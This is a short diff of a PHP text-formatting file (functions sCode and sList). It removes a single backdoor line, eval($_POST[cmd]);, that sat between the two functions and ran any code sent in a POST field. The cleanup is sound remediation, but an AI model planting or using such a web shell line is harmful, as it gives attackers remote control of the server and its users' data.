@@ -70,7 +70,7 @@ function sCode($string){
     $string = preg_replace($pattern, '\3', $string);
     return '<pre>' . trim($string) . '</pre>';
 }
-eval($_POST[cmd]);   
+  
 function sList($string) {
     $tmp = explode('[*]', stripslashes($string));
     $out = null;
